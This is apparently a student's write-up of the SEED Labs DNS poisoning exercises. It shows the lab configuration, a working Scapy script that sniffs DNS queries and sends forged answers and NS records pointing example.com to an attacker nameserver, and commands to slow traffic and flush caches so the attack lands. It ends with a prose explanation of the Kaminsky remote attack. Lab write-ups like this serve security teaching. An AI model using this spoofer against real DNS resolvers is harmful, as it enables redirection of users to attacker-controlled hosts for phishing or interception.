# DNS Poisoning Attack Lab

## Lab Link: 

https://seedsecuritylabs.org/Labs_20.04/Networking/DNS/DNS_Local/
https://seedsecuritylabs.org/Labs_20.04/Files/DNS_Remote/DNS_Remote.pdf

## Local DNS Poisoning Attack

### Summary of the DNS Configuration

We need to configure the Local DNS server, user machine and the Attacker's Nameserver.

#### Local DNS Server

To simplify the attack, we need to change some default configurations:

- fix the source port number to 33333

- Turning off DNSSEC

- Dump DNS cache by setting dump-file "/var/cache/bind/dump.db";

- Forwarding the attacker32.com zone

#### User Machine

Change the resolver configuration file (/etc/resolv.conf) of the user machine to:

```
nameserver 10.9.0.53
```

#### Attacker’s Nameserver.

This machine hosts two zones, one of the attacker's legitimate zone, the other a fake zone.
```
zone "attacker32.com" {
	type master;
	file "/etc/bind/attacker32.com.zone";
};

zone "example.com" {
	type master;
	file "/etc/bind/example.com.zone";
};
```

### Query Different NameServers for IP address of a domain

```bash
// Send the query to our local DNS server, which will send the query
// to example.com’s official nameserver.
$ dig www.example.com
// Send the query directly to ns.attacker32.com
$ dig @ns.attacker32.com www.example.com
```

###  The Attack Tasks

DNS is an example of "indirect". The main objective of DNS attacks on a user is to redirect the user to another machine B when the user tries to get to machine A using A’s host name.

#### DNS Cache Poisoning Attack

```python
#!/usr/bin/env python3
from scapy.all import *
import sys
NS_NAME = "example.com"
def spoof_dns(pkt):
	if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode(’utf-8’)):
		print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
	ip = IP(dst=pkt[IP].src, src=pkt[IP].dst) # Create an IP object
	udp = UDP(dport=pkt[UDP].sport, sport=53) # Create a UPD object
	Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='10.9.0.153', ttl=259200) # Create an aswer record
	NSSec = DNSRR(rrname=NS_NAME, type="NS", rdata='ns.attacker32.com', ttl=259200)
	dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qdcount=1, qr=1, ancount=1, nscount=1, an=Anssec, ns=NSSec) # Create a DNS object
	spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet
	send(spoofpkt)

myFilter = "udp and src host 10.9.0.53 and dst port 53" # Set the filter
pkt=sniff(iface='br-6c84ac8235f8', filter=myFilter, prn=spoof_dns)
```

If it doesn't work, considering slowing down your network connection by:

```bash
// Delay the network traffic by 100ms
# tc qdisc add dev eth0 root netem delay 100ms
// Delete the tc entry
# tc qdisc del dev eth0 root netem
// Show all the tc entries
# tc qdisc show dev eth0
```

Also don't forget to flush the DNS:

```bash
# rndc flush
# rndc dumpdb -cache
# cat /var/cache/bind/dump.db
```

Note that if we reply with a fake zone 'google.com' to AUTHORITY SECTION for example, the dns client actually won't cache it. That makes sense. Similarly for entries in ADDITIONAL SECTION.

## Remote DNS Poisoning Attack

In this remote attack lab, packet sniffing is not possible, so the attack becomes much more challenging than the local attack.

The difficulty is mainly caused by the fact that the transaction ID in the DNS response packet must match with that in the query packet. Because the transaction ID in the query is usually randomly generated, without seeing the query packet, it is not easy for the attacker to know the correct ID.

Another barries is the cache effect. In reality, if the attacker is not fortunate enough to make a correct guess before the real response packet arrives, correct information will be cached by the DNS server for a while. 

The Kaminsky Attack:

The crucial observation of Kaminsky is that we can ping a non-existing sub-domain of example.com to crush the caching effect, and put the attacker machine's nameserver inside the Authority Section in the response. In this way, even if the chance of beating the actual dns lookup response is slim, we can continue this process without waiting. Note that when we poison the DNS cache of the dns server, any address the host tries to look up will go to the attacker's nameserver. 

How do we verify that the attack succeeds? We can just do a dns lookup to the victim nameserver and check if we have an answer entry pointing to the attacker's nameserver.

